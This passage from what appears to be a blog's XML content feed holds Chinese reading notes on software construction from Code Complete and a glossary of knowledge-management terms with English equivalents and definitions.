            <tag> 空闲扩展 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件构建</title>
      <link href="/cs/%E8%BD%AF%E4%BB%B6%E6%9E%84%E5%BB%BA/"/>
      <url>/cs/%E8%BD%AF%E4%BB%B6%E6%9E%84%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>代码大全之软件构建<br><a id="more"></a></p><h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><p><img src="https://upload-images.jianshu.io/upload_images/6908911-f973558f62138af6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="要点"></p><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><p><a href="/构建">构建</a>   正式和非正式项目的红头文件<br>构建有时也被认为是“编码( coding)”或“编程( programming)”。<br>“编码”算不上是最贴切的词,因为它有一种“把已经存在的设计机械化地翻译成计算机语言”的意味;<br>而构建并不都是这么机械化的,需要可观的创造力和判断力。<br>在全书中,我也常常用“编程”代替“构建”。</p><h1 id="清单"><a href="#清单" class="headerlink" title="清单"></a>清单</h1><p>软件开发过程中的各种不同的活动( activity):<br>定义问题(problem definition)<br>需求分析(requirements development)<br>规划构建(construction planning)<br>软件架构(software architecture),或高层设计(high- -level design)<br>详细设计(detailed design)<br>编码与调试(coding and debugging)<br>单元测试(unit testing)<br>集成测试(integration testing)<br>集成(Integration)<br>系统测试(system testing)<br>保障维护(corrective maintenance)</p><h1 id="具体活动"><a href="#具体活动" class="headerlink" title="具体活动"></a>具体活动</h1><p>验证有关的基础工作已经完成,因此构建活动可以顺利地进行下去。<br>确定如何测试所写的代码。<br>设计并编写类( class)和子程序( routine)。<br>创建并命名变量( variable)和具名常量( named constant)。<br>选择控制结构( control structure),组织语句块。<br>对你的代码进行单元测试和集成测试,并排除其中的错误。<br>评审开发团队其他成员的底层设计和代码,并让他们评审你的工作。<br>润饰代码,仔细进行代码的格式化和注释<br>将单独开发的多个软件组件集成为一体<br>调整代码( tuning code),让它更快、更省资源。</p><h1 id="重要的非构建活动"><a href="#重要的非构建活动" class="headerlink" title="重要的非构建活动"></a>重要的非构建活动</h1><p>管理( management)、需求分析、软件架构设计、用户界面设计、系统测试、维护</p><h1 id="激动人心的项目"><a href="#激动人心的项目" class="headerlink" title="激动人心的项目"></a>激动人心的项目</h1><p>互联网、电影特技、医疗中的生命维持系统、太空计划、航空、高速金融分析、科学研究</p><h1 id="示意图"><a href="#示意图" class="headerlink" title="示意图"></a>示意图</h1><p><img src="https://upload-images.jianshu.io/upload_images/6908911-12ba8a06a07852de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="构建活动的地位"></p><h1 id="构建的重要性"><a href="#构建的重要性" class="headerlink" title="构建的重要性"></a>构建的重要性</h1><p><img src="https://upload-images.jianshu.io/upload_images/6908911-c5bab172a8062ff9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="编程重要性"></p>]]></content>
      
      
      
        <tags>
            
            <tag> wiki </tag>
            
            <tag> mind </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书笔记：知识整理术语表</title>
      <link href="/cs/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86%E6%9C%AF%E8%AF%AD%E8%A1%A8/"/>
      <url>/cs/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86%E6%9C%AF%E8%AF%AD%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<p>坚持收获，努力回报。<br>自整理体系、按字母排序和分条显示讲的内容是完全一件的，只是呈现的方式不同。只看自整理体系就好了。<br><a id="more"></a></p><h1 id="自整理体系"><a href="#自整理体系" class="headerlink" title="自整理体系"></a>自整理体系</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><a href="#政策">政策</a> <a href="#学习">学习</a> <a href="#环境可寻找">环境可寻找</a></p><h2 id="知识整理全过程"><a href="#知识整理全过程" class="headerlink" title="知识整理全过程"></a>知识整理全过程</h2><p><a href="#知识获取和记录">知识获取和记录</a> <a href="#记录保存和管理">记录保存和管理</a> <a href="#知识交换">知识交换</a> <a href="#知识移交">知识移交</a> <a href="#"></a><br><a href="#验证">验证</a> <a href="#概念验证">概念验证</a> <a href="#行动前审查">行动前审查</a> <a href="#同行协助">同行协助</a> <a href="#同行审查">同行审查</a> <a href="#知识审计">知识审计</a> <a href="#"></a><br><a href="#内容管理">内容管理</a> <a href="#知识整合">知识整合</a> <a href="#铺开">铺开</a> <a href="#嵌入">嵌入</a> <a href="#治理">治理</a> <a href="#知识保留">知识保留</a> <a href="#编码知识">编码知识</a> <a href="#资源映射">资源映射</a> <a href="#回顾">回顾</a> <a href="#基于搜索的应用">基于搜索的应用</a> <a href="#任务后检视">任务后检视</a></p><h2 id="知识整理存储平台"><a href="#知识整理存储平台" class="headerlink" title="知识整理存储平台"></a>知识整理存储平台</h2><p><a href="#分类">分类</a> <a href="#分类面">分类面</a> <a href="#企业分类管理系统">企业分类管理系统</a> <a href="#自动分类工具">自动分类工具</a> <a href="#标签云">标签云</a> <a href="#标记系统">标记系统</a><br><a href="#博客">博客</a> <a href="#目的社区">目的社区</a> <a href="#门户">门户</a> <a href="#Yammer黄页">Yammer黄页</a> <a href="#问答论坛">问答论坛</a> <a href="#维基">维基</a> <a href="#维基马拉松">维基马拉松</a></p><h2 id="知识类型"><a href="#知识类型" class="headerlink" title="知识类型"></a>知识类型</h2><p><a href="#大数据">大数据</a> <a href="#数据">数据</a> <a href="#元数据">元数据</a> <a href="#信息">信息</a> <a href="#显性知识">显性知识</a> <a href="#隐性知识">隐性知识</a></p><h2 id="知识整理成果"><a href="#知识整理成果" class="headerlink" title="知识整理成果"></a>知识整理成果</h2><p><a href="#3-Report">3 Report</a> <a href="#知识库">知识库</a> <a href="#知识地图">知识地图</a> <a href="#知识组织">知识组织</a> <a href="#知识咖啡馆">知识咖啡馆</a> <a href="#知识管理">知识管理</a> <a href="#知识管理框架">知识管理框架</a> <a href="#知识管理计划">知识管理计划</a> <a href="#战略知识领域">战略知识领域</a><br><a href="#经验教训数据库">经验教训数据库</a> <a href="#经验教训管理系统">经验教训管理系统</a></p><h2 id="知识整理实践"><a href="#知识整理实践" class="headerlink" title="知识整理实践"></a>知识整理实践</h2><p><a href="#失败展览会">失败展览会</a> <a href="#知识展览会">知识展览会</a><br><a href="#收益映射">收益映射</a> <a href="#最佳实践包装">最佳实践包装</a> <a href="#试点">试点</a> <a href="#实践所有者">实践所有者</a> <a href="#对话">对话</a> <a href="#社交媒体">社交媒体</a> <a href="#社交网络分析">社交网络分析</a> <a href="#社会认同">社会认同</a> <a href="#实践社区">实践社区</a> <a href="#创新">创新</a> <a href="#胜任力">胜任力</a> <a href="#商业智能">商业智能</a> <a href="#公司健忘症">公司健忘症</a></p><h2 id="知识整理人才"><a href="#知识整理人才" class="headerlink" title="知识整理人才"></a>知识整理人才</h2><p><a href="#找人">找人</a> <a href="#合伙">合伙</a> <a href="#人力资本">人力资本</a> <a href="#接力棒传递">接力棒传递</a><br><a href="#知识管理拥护者">知识管理拥护者</a> <a href="#知识拥有者">知识拥有者</a> <a href="#知识经纪人">知识经纪人</a> <a href="#知识经理">知识经理</a> <a href="#"></a><br><a href="#知识分析师">知识分析师</a> <a href="#知识工程师">知识工程师</a> <a href="#信息架构师">信息架构师</a> <a href="#专业支持律师">专业支持律师</a> <a href="#"></a><br><a href="#企业搜索专家">企业搜索专家</a> <a href="#企业分类学家">企业分类学家</a> <a href="#主题专家">主题专家</a> <a href="#专家系统">专家系统</a> <a href="#学习历史学家">学习历史学家</a></p><h2 id="知识整理文化"><a href="#知识整理文化" class="headerlink" title="知识整理文化"></a>知识整理文化</h2><p><a href="#文化">文化</a> <a href="#无形资产">无形资产</a> <a href="#知识">知识</a> <a href="#知识资产">知识资产</a> <a href="#知识资产创造流程">知识资产创造流程</a></p><h1 id="按字母顺序排列的表格"><a href="#按字母顺序排列的表格" class="headerlink" title="按字母顺序排列的表格"></a>按字母顺序排列的表格</h1><table><thead><tr><th>中文名</th><th>英文名</th><th>释义</th></tr></thead><tbody><tr><td>3 Report</td><td></td><td>一种结构化文档，遵循审查、分析和记录关于产品故障与产品设计改进知识的过程。</td></tr><tr><td>包装</td><td>Packaging</td><td>将知识编纂、合成一致的格式，这样就可以提供给知识客户，以方便最大限度地再利用。</td></tr><tr><td>标签云</td><td>Tag cloud</td><td>资源集合中的一群常用的关键词，字体的大小象征着该关键词的使用频率。</td></tr><tr><td>标记系统</td><td>Tagging System</td><td>一种系统，允许用户将自己的关键词添加到信息或知识资源。</td></tr><tr><td>博客</td><td>Blog</td><td>一种在线软件应用，可写作并发布简短的文章，按时间顺序显示条目。可用来记录项目和活动发生时的知识与见解。</td></tr><tr><td>编码知识</td><td>Codified Knowledge</td><td>编码知识是以文本、视频或图片形式记录的知识，也称为显性知识。</td></tr><tr><td>大数据</td><td>Big Data</td><td>一个广义的术语，指处理和挖掘多源的、非常大的数据集，为业务获得有意义和可行的见解。</td></tr><tr><td>创新</td><td>Innovation</td><td>通过创造新知识，实现和验证想法、试验和解决问题，推出有显著改进的产品、流程和服务。</td></tr><tr><td>对话</td><td>Dialogue</td><td>会话的一种方式，强调探讨不同的观点并实现相互理解，不一定达成协议。</td></tr><tr><td>分类</td><td>Taxonomy</td><td>一个结构化、受控的词汇表，用来描述文档或讨论的所属领域。分类是元数据的一部分，用于支持相关内容的搜索和检索。分类也可用来描述关联个人和社区的专业知识主题。</td></tr><tr><td>分类面</td><td>Taxonomy Facet</td><td>分类的一个元素，它关注知识资源的具体属性，例如文档的类型、参考的活动和涉及的实体。</td></tr><tr><td>公司健忘症</td><td>Corporate Amnesia</td><td>当人员离开时，由于知识流失而造成关键能力的丧失。</td></tr><tr><td>概念验证</td><td>Proof of Concept</td><td>一种规模很小的活动，目的是向管理层的利益相关者证明KM的价值。</td></tr><tr><td>环境可寻找</td><td>Ambient Findability</td><td>确保在需要的时间点或环境中，相关的知识资源自动弹出。这意味着要预见可能需要相关资源的地方并设计在该时间点将内容“推送”给用户。</td></tr><tr><td>收益映射</td><td>Best Mapping</td><td>一种系统形象的方法，演示KM举措和积极的业务成果之间的联系。</td></tr><tr><td>回顾</td><td>Retrospect</td><td>项目或重大活动周期结束时的结构化促进会，以在团队解散前吸取经验教训。</td></tr><tr><td>合伙</td><td>Partnering</td><td>一种结构化的方法，以确定合作伙伴并与他们交往，协商责任和贡献，同时认可合作伙伴的条件限制和优先事项。</td></tr><tr><td>接力棒传递</td><td>Baton Passing</td><td>一种促进的过程，将知识从一个团队传递给进行同类工作的另一个团队。</td></tr><tr><td>经验教训数据库</td><td>Lessons Database</td><td>一个数据库，其中存储了经验教训，并且可以分类和检索。</td></tr><tr><td>经验教训管理系统</td><td>Lessons Management System</td><td>一个系统，用来管理经验教训的吸取、验证、嵌入和应用。与经验教训数据库不同的是包含工作流程，以确保经验教训得到吸取和学习，而不仅仅是记录和存储。</td></tr><tr><td>记录保存和管理</td><td>Recordkeeping, Records Management</td><td>一套系统流程，保存正式记录，包括官方决定、活动和交易，目的是管理控制、问责、合规，保存组织记忆。</td></tr><tr><td>基于搜索的应用</td><td>Search-Based Application</td><td>一种软件应用，利用搜索引擎向有需要的特定用户主动提供非常有针对性的内容。</td></tr><tr><td>目的社区</td><td>Community of Purpose</td><td>类似于实践社区，但成员的分享聚焦于有共同目的、流程或目标。社区关注交付共同目的，例如，创建最佳实践。</td></tr><tr><td>门户</td><td>Portal</td><td>一个网站，提供对知识库、软件应用和协作工具的访问使用。</td></tr><tr><td>内容管理</td><td>Content Management</td><td>运用流程和系统来管理信息内容，以支持组织的需求，无论是网络内容、文档、记录，还是其他形式的编码知识。</td></tr><tr><td>铺开</td><td>Roll-out</td><td>将新的工作方式扩大到整个组织的过程。</td></tr><tr><td>嵌入</td><td>Embedding</td><td>旨在确保新工作方式成为永久性无形资产的一系列流程和干预措施。</td></tr><tr><td>企业搜索专家</td><td>Enterprise Search Specialist</td><td>一种角色，负责确保搜索技术有效地利用分类法，支持信息架构师的设计目标，帮助用户查找和访问对他们有用的信息和知识资源。</td></tr><tr><td>企业分类学家</td><td>Enterprise Taxonomist</td><td>一种角色，负责开发、实施和维护企业分类法，以支持知识资源的寻找、访问和再利用。</td></tr><tr><td>企业分类管理系统</td><td>Enterprise Taxonomy Management System</td><td>一个软件应用，支持多个分类法、元数据元素和其他参考词语的管理系统集中管理，并作为许多不同信息系统的统一词汇源。</td></tr><tr><td>人力资本</td><td>Human Capital</td><td>由一个组织拥有，使其能够有效工作的知识、能力、价值观和社会属性的储备，人力资本是无形资产的一种形式。</td></tr><tr><td>任务后检视</td><td>After Action Review</td><td>一种结构化的简短会议，在会上团队审查最近的工作活动，并为未来总结经验教训。这个过程通常用于短期活动，例如项目内的任务。</td></tr><tr><td>商业智能</td><td>Business Intelligence</td><td>通过收集和分析来自环境的信息支持决策，以避免风险，为变革创造可能性。</td></tr><tr><td>实践社区</td><td>Community of Practice</td><td>以人为中心的网络，他们从事相同类型的活动或实践领域，在线上或线下定期分享有关他们实践的知识，互相帮助，使彼此工作做得更好。</td></tr><tr><td>胜任力</td><td>Competence</td><td>技术知识、技能和价值观的结合，使某人有能力发挥作用或职能。</td></tr><tr><td>数据</td><td>Data</td><td>测量结果、观察所得和事实，可以组合并整理成信息。</td></tr><tr><td>失败展览会</td><td>Fail Fair</td><td>一种企业范围内的活动，目的是展示组织关于关键知识和改进机会的失败，并体现领导层对探索失败、寻求知识的文化意愿。</td></tr><tr><td>试点</td><td>Pilot</td><td>一个小规模的项目，用来检验组织某个部分的KM框架，并向业务利益相关者展示KM的价值。试点还应该产生见解，从而改进KM框架。</td></tr><tr><td>实践所有者</td><td>Practice Owner</td><td>某领域专家，负责维护该业务专业实践领域的知识，确保能发展和保持必要的能力，同时配套知识库可用和更新。</td></tr><tr><td>社交媒体</td><td>Social Media</td><td>在线软件应用，旨在鼓励和促进社会交往。</td></tr><tr><td>社交网络分析</td><td>Social Network Analysis</td><td>一种方法，描绘团队、社区或组织中的人际交往，评估联系的程度，并确定干预措施来改进知识和信息的流动。</td></tr><tr><td>社会认同</td><td>Social Proof</td><td>使人相信一种方法的价值，向他们展示和他们情况类似的人从这种方法中受益的例子。</td></tr><tr><td>同行协助</td><td>Peer Assist</td><td>一种结构化的促进会或研讨会，需要解决问题或战胜挑战的团队，邀请其他业务部门或行业的人，分享经验、见解和知识。</td></tr><tr><td>同行审查</td><td>Peer Review</td><td>一种结构化的促进会或研讨会，邀请其他业务部门或行业的人，审查另一团队的工作。</td></tr><tr><td>文化</td><td>Culture</td><td>社区或组织内部表现出来的独特行为、假设和价值观模式。因为它们融入了行为，所以很难简单地通过吸引人的理由来改变，而是必须通过系统的变革计划，实施新的流程、角色和其他推动因素。</td></tr><tr><td>无形资产</td><td>Intangible Assets</td><td>一个组织的资产，但不能像现金、设施或设备这些有形资产一样量化和列在资产负债表上。无形资产的例子有名声、商誉、客户资本、人力资本或能力。知识是一种重要的无形资产。</td></tr><tr><td>问答论坛</td><td>Q&amp;A Forum</td><td>一个基于电子邮件的讨论论坛，围绕着问题和答案建立。这些可以成为在实践社区内交流知识的一种强大手段。社区成员可以在论坛里提问，由他们在世界其他地方的同行回答。</td></tr><tr><td>维基</td><td>Wiki</td><td>一组网页，读者通过网页浏览器界面可以直接编辑。</td></tr><tr><td>维基马拉松</td><td>Wikithon</td><td>一个促进活动，一组知识所有者或实践社区成员一起在维基平台上合成集体知识库。</td></tr><tr><td>显性知识</td><td>Explicit Knowledge</td><td>以前的定义是显性知识是可以表达和描述的知识。如今，这个术语已经变成了编码知识的同义词。</td></tr><tr><td>信息</td><td>Information</td><td>能告诉你一些事情的数据的集合和呈现。</td></tr><tr><td>信息架构师</td><td>Information Architect</td><td>一个角色，负责在门户网站或知识库这样的系统中设计信息和知识环境，以便用户可以轻松浏览和检索信息资源。</td></tr><tr><td>行动前审查</td><td>Baton Passing</td><td>一种促进讨论会，在项目或活动周期开始前，确定与项目有关的知识需求和优先学习的内容。</td></tr><tr><td>学习</td><td>Learning</td><td>由于获得新的见解和知识，从而改进做事方式。</td></tr><tr><td>学习历史学家</td><td>Learning Historian</td><td>一个角色，负责通过访谈、数据收集和分析来创造可学习的历史。从特定的活动或事件中萃取可学习的知识，并就经验教训的应用给出指导方针。</td></tr><tr><td>元数据</td><td>Metadata</td><td>描述数据或文档属性的数据，例如标题、作者、创建日期、主题、结构、安全分类。元数据有助于内容的管理，并支持对内容的访问，例如通过搜索。</td></tr><tr><td>隐性知识</td><td>Tacit Knowledge</td><td>保存在人的头脑和身体中的知识，有可能写下来，也有可能无法记录。</td></tr><tr><td>验证</td><td>Validate</td><td>确保某件事中的教训或知识点是有效与可防范的，并可作为最佳实践，在将来可以应用。</td></tr><tr><td>Yammer黄页</td><td>Yellow Pages</td><td>一种商用微博工具，微博支持分享短消息和更新。见“找人”。</td></tr><tr><td>最佳实践</td><td>Best Practice</td><td>一种做事的实践或方法，经过确认和验证，是目前已知最好的做事方法。</td></tr><tr><td>治理</td><td>Governance</td><td>通过架构、政策、指标、绩效管理和支持的组合，实现对组织职能的有效管理、监督和问责。</td></tr><tr><td>战略知识领域</td><td>Strategic Knowledge Areas</td><td>战略中基于知识的能力，对组织的效率和竞争至关重要。</td></tr><tr><td>找人</td><td>People Finder</td><td>一个知识目录，将人名与知识领域匹配，用以帮助员工找出在组织中“谁知道什么”。</td></tr><tr><td>自动分类工具</td><td>Autoclassification Tools</td><td>给信息和知识资产自动分配标签或分类主题的软件工具。它们可以按给用户的检验标签或主题工作，或者它们可以完全自动化，在后台工作，不用人干预。</td></tr><tr><td>专家系统</td><td>Expert System</td><td>一种系统，将专家的知识和决策规则嵌入软件应用中的算法与工作流程。</td></tr><tr><td>资源映射</td><td>Resource Mapping</td><td>一种结构化和形象的方法，可确定KM实施所需的资源，还有谁将负责贡献这些资源。</td></tr><tr><td>专业支持律师</td><td>Professional Support Lawyer, PSL</td><td>律师事务所的一个角色，负责提建议，运用先例和诀窍，为客户提供培训和支持。</td></tr><tr><td>政策</td><td>Policy</td><td>对特定活动领域相关雇员期望的明确说明，阐明指导原则、角色和责任、支持指南。</td></tr><tr><td>主题专家</td><td>Subject Matter Expert</td><td>社区或职能中的某人，拥有子领域主题知识的所有权或管理权，并代表社区或组织管理该子领域，经常接受实践所有者的指导或监督。</td></tr><tr><td>知识资产创造流程</td><td>Knowledge Asset Creation Process,KNAC</td><td>由西门子开发的一个五步过程，用来围绕一个特定的主题或产品创造合成知识资产。</td></tr><tr><td>知识</td><td>Knowledge</td><td>让你采取有效行动的诀窍、技巧、经验、理解和经验法则。另见显性知识和隐性知识。</td></tr><tr><td>知识分析师</td><td>Knowledge Analyst</td><td>一种角色，负责围绕来自不同知识库的具体主题，检索和整理知识资源，并准备向内部或外部客户汇报。</td></tr><tr><td>知识资产</td><td>Knowledge Assets</td><td>分散独立、可识别的知识项目或集合，有助于使组织有效地工作。知识资产覆盖了从显性到隐性知识类型的整个范围。它们包括技巧、能力、方法、实践、经验领域、专业知识和关系资本。</td></tr><tr><td>知识审计</td><td>Knowledge Audit</td><td>一个总称，指系统地评估知识资产、知识差距、知识流和KM流程，目标是提出改进建议。通常是KM实施详细规划过程的一部分。</td></tr><tr><td>知识库</td><td>Knowledge Bank, Knowledge Base</td><td>收藏组织或实践社区的显性知识的地方。</td></tr><tr><td>知识经纪人</td><td>Knowledge Broker</td><td>一种角色，将他们与工作之外的知识和信息联系起来，通常通过同事自己的社交网络。</td></tr><tr><td>知识咖啡馆</td><td>Knowledge Café</td><td>一种促进性大型会议，通常在咖啡厅风格的桌子旁进行，在会上小组分享对话。一般每桌都有一位引导员促进对话，在每个对话周期结束时，同桌的其他参与者分开，加入不同小组和不同桌子。知识咖啡馆有利于给复杂的问题或挑战带来多个视角，并加强交流和建立关系。</td></tr><tr><td>知识获取和记录</td><td>Knowledge Capture, Knowledge Documentation</td><td>将隐性知识记录为编码形式，从而成为显性知识的过程。</td></tr><tr><td>知识工程师</td><td>Knowledge Engineer</td><td>一种角色，负责从专家、团队或部门获取知识。</td></tr><tr><td>知识交换</td><td>Knowledge Exchange</td><td>一种会议，许多人在会上讨论和互相学习，在知识交流的过程中，每个人都是贡献者，同时也是学习者。</td></tr><tr><td>知识展览会</td><td>Knowledge Fair</td><td>一种组织范围的活动，目的是展示其知识能力和显示KM的好处。</td></tr><tr><td>知识移交</td><td>Knowledge Handover</td><td>一个促进的过程，将已经完成项目的项目组获得的经验教训转移给可能需要该知识的其他项目组。</td></tr><tr><td>知识管理</td><td>Knowledge Management</td><td>一种系统的战略方法，将一个组织集体知识的价值最大化。</td></tr><tr><td>知识管理拥护者</td><td>Knowledge Management Champion</td><td>一种角色，这个人通常除了正规的职能角色，另外被赋予在其业务部分支持KM活动的责任。</td></tr><tr><td>知识管理框架</td><td>Knowledge Management Framework</td><td>一种框架，描述了KM要有效嵌入组织的工作方式所需的推动因素。</td></tr><tr><td>知识管理计划</td><td>Knowledge Management Plan</td><td>一种文档，记录了知识需求、知识差距、知识来源和获得策略、知识创造角色、责任和既定项目或活动的流程。</td></tr><tr><td>知识经理</td><td>Knowledge Manager</td><td>一种角色，其主要职责是确保其所在组织中团队的知识得到管理，从而实现业务利益。</td></tr><tr><td>知识地图</td><td>Knowledge Map</td><td>一种直观的表示，显示知识资产在组织中的位置和它们如何与关键的功能区和活动相关，或者直观地表示整个组织的知识流和依赖关系。</td></tr><tr><td>知识组织</td><td>Knowledge Organization</td><td>一套流程，用来组织机构的知识资产，以便能够有效地管理、评估和使用它们。</td></tr><tr><td>知识拥有者</td><td>Knowledge Owner</td><td>管理特定领域的知识，负责知识库的内容，保持其准确、完整和处于最新状态。</td></tr><tr><td>知识保留</td><td>Knowledge Retention</td><td>一套流程，用来在个别人员流动时，将重要知识留在组织内。通常把重点放在隐性知识的保留和传递上。</td></tr><tr><td>知识整合</td><td>Knowledge Synthesis</td><td>将来自多个源头的知识编纂，并提取到一套格式一致的指导性文件中，以便参考。</td></tr></tbody></table><h1 id="分条显示"><a href="#分条显示" class="headerlink" title="分条显示"></a>分条显示</h1><h2 id="3-Report"><a href="#3-Report" class="headerlink" title="3 Report"></a>3 Report</h2><p>一种结构化文档，遵循审查、分析和记录关于产品故障与产品设计改进知识的过程。</p><h2 id="包装"><a href="#包装" class="headerlink" title="包装"></a>包装</h2><p>Packaging<br>将知识编纂、合成一致的格式，这样就可以提供给知识客户，以方便最大限度地再利用。</p><h2 id="标签云"><a href="#标签云" class="headerlink" title="标签云"></a>标签云</h2><p>Tag cloud<br>资源集合中的一群常用的关键词，字体的大小象征着该关键词的使用频率。</p><h2 id="标记系统"><a href="#标记系统" class="headerlink" title="标记系统"></a>标记系统</h2><p>Tagging System<br>一种系统，允许用户将自己的关键词添加到信息或知识资源。</p><h2 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h2><p>Blog<br>一种在线软件应用，可写作并发布简短的文章，按时间顺序显示条目。可用来记录项目和活动发生时的知识与见解。</p><h2 id="编码知识"><a href="#编码知识" class="headerlink" title="编码知识"></a>编码知识</h2><p>Codified Knowledge<br>编码知识是以文本、视频或图片形式记录的知识，也称为显性知识。</p><h2 id="大数据"><a href="#大数据" class="headerlink" title="大数据"></a>大数据</h2><p>Big Data<br>一个广义的术语，指处理和挖掘多源的、非常大的数据集，为业务获得有意义和可行的见解。</p><h2 id="创新"><a href="#创新" class="headerlink" title="创新"></a>创新</h2><p>Innovation<br>通过创造新知识，实现和验证想法、试验和解决问题，推出有显著改进的产品、流程和服务。</p><h2 id="对话"><a href="#对话" class="headerlink" title="对话"></a>对话</h2><p>Dialogue<br>会话的一种方式，强调探讨不同的观点并实现相互理解，不一定达成协议。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>Taxonomy<br>一个结构化、受控的词汇表，用来描述文档或讨论的所属领域。分类是元数据的一部分，用于支持相关内容的搜索和检索。分类也可用来描述关联个人和社区的专业知识主题。</p><h2 id="分类面"><a href="#分类面" class="headerlink" title="分类面"></a>分类面</h2><p>Taxonomy Facet<br>分类的一个元素，它关注知识资源的具体属性，例如文档的类型、参考的活动和涉及的实体。</p><h2 id="公司健忘症"><a href="#公司健忘症" class="headerlink" title="公司健忘症"></a>公司健忘症</h2><p>Corporate Amnesia<br>当人员离开时，由于知识流失而造成关键能力的丧失。</p><h2 id="概念验证"><a href="#概念验证" class="headerlink" title="概念验证"></a>概念验证</h2><p>Proof of Concept<br>一种规模很小的活动，目的是向管理层的利益相关者证明KM的价值。</p><h2 id="环境可寻找"><a href="#环境可寻找" class="headerlink" title="环境可寻找"></a>环境可寻找</h2><p>Ambient Findability<br>确保在需要的时间点或环境中，相关的知识资源自动弹出。这意味着要预见可能需要相关资源的地方并设计在该时间点将内容“推送”给用户。</p><h2 id="收益映射"><a href="#收益映射" class="headerlink" title="收益映射"></a>收益映射</h2><p>Best Mapping<br>一种系统形象的方法，演示KM举措和积极的业务成果之间的联系。</p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>Retrospect<br>项目或重大活动周期结束时的结构化促进会，以在团队解散前吸取经验教训。</p><h2 id="合伙"><a href="#合伙" class="headerlink" title="合伙"></a>合伙</h2><p>Partnering<br>一种结构化的方法，以确定合作伙伴并与他们交往，协商责任和贡献，同时认可合作伙伴的条件限制和优先事项。</p><h2 id="接力棒传递"><a href="#接力棒传递" class="headerlink" title="接力棒传递"></a>接力棒传递</h2><p>Baton Passing<br>一种促进的过程，将知识从一个团队传递给进行同类工作的另一个团队。</p><h2 id="经验教训数据库"><a href="#经验教训数据库" class="headerlink" title="经验教训数据库"></a>经验教训数据库</h2><p>Lessons Database<br>一个数据库，其中存储了经验教训，并且可以分类和检索。</p><h2 id="经验教训管理系统"><a href="#经验教训管理系统" class="headerlink" title="经验教训管理系统"></a>经验教训管理系统</h2><p>Lessons Management System<br>一个系统，用来管理经验教训的吸取、验证、嵌入和应用。与经验教训数据库不同的是包含工作流程，以确保经验教训得到吸取和学习，而不仅仅是记录和存储。</p><h2 id="记录保存和管理"><a href="#记录保存和管理" class="headerlink" title="记录保存和管理"></a>记录保存和管理</h2><p>Recordkeeping, Records Management<br>一套系统流程，保存正式记录，包括官方决定、活动和交易，目的是管理控制、问责、合规，保存组织记忆。</p><h2 id="基于搜索的应用"><a href="#基于搜索的应用" class="headerlink" title="基于搜索的应用"></a>基于搜索的应用</h2><p>Search-Based Application<br>一种软件应用，利用搜索引擎向有需要的特定用户主动提供非常有针对性的内容。</p><h2 id="目的社区"><a href="#目的社区" class="headerlink" title="目的社区"></a>目的社区</h2><p>Community of Purpose<br>类似于实践社区，但成员的分享聚焦于有共同目的、流程或目标。社区关注交付共同目的，例如，创建最佳实践。</p><h2 id="门户"><a href="#门户" class="headerlink" title="门户"></a>门户</h2><p>Portal<br>一个网站，提供对知识库、软件应用和协作工具的访问使用。</p><h2 id="内容管理"><a href="#内容管理" class="headerlink" title="内容管理"></a>内容管理</h2><p>Content Management<br>运用流程和系统来管理信息内容，以支持组织的需求，无论是网络内容、文档、记录，还是其他形式的编码知识。</p><h2 id="铺开"><a href="#铺开" class="headerlink" title="铺开"></a>铺开</h2><p>Roll-out<br>将新的工作方式扩大到整个组织的过程。</p><h2 id="嵌入"><a href="#嵌入" class="headerlink" title="嵌入"></a>嵌入</h2><p>Embedding<br>旨在确保新工作方式成为永久性无形资产的一系列流程和干预措施。</p><h2 id="企业搜索专家"><a href="#企业搜索专家" class="headerlink" title="企业搜索专家"></a>企业搜索专家</h2><p>Enterprise Search Specialist<br>一种角色，负责确保搜索技术有效地利用分类法，支持信息架构师的设计目标，帮助用户查找和访问对他们有用的信息和知识资源。</p><h2 id="企业分类学家"><a href="#企业分类学家" class="headerlink" title="企业分类学家"></a>企业分类学家</h2><p>Enterprise Taxonomist<br>一种角色，负责开发、实施和维护企业分类法，以支持知识资源的寻找、访问和再利用。</p><h2 id="企业分类管理系统"><a href="#企业分类管理系统" class="headerlink" title="企业分类管理系统"></a>企业分类管理系统</h2><p>Enterprise Taxonomy Management System<br>一个软件应用，支持多个分类法、元数据元素和其他参考词语的管理系统集中管理，并作为许多不同信息系统的统一词汇源。</p><h2 id="人力资本"><a href="#人力资本" class="headerlink" title="人力资本"></a>人力资本</h2><p>Human Capital<br>由一个组织拥有，使其能够有效工作的知识、能力、价值观和社会属性的储备，人力资本是无形资产的一种形式。</p><h2 id="任务后检视"><a href="#任务后检视" class="headerlink" title="任务后检视"></a>任务后检视</h2><p>After Action Review<br>一种结构化的简短会议，在会上团队审查最近的工作活动，并为未来总结经验教训。这个过程通常用于短期活动，例如项目内的任务。</p><h2 id="商业智能"><a href="#商业智能" class="headerlink" title="商业智能"></a>商业智能</h2><p>Business Intelligence<br>通过收集和分析来自环境的信息支持决策，以避免风险，为变革创造可能性。</p><h2 id="实践社区"><a href="#实践社区" class="headerlink" title="实践社区"></a>实践社区</h2><p>Community of Practice<br>以人为中心的网络，他们从事相同类型的活动或实践领域，在线上或线下定期分享有关他们实践的知识，互相帮助，使彼此工作做得更好。</p><h2 id="胜任力"><a href="#胜任力" class="headerlink" title="胜任力"></a>胜任力</h2><p>Competence<br>技术知识、技能和价值观的结合，使某人有能力发挥作用或职能。</p><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p>Data<br>测量结果、观察所得和事实，可以组合并整理成信息。</p><h2 id="失败展览会"><a href="#失败展览会" class="headerlink" 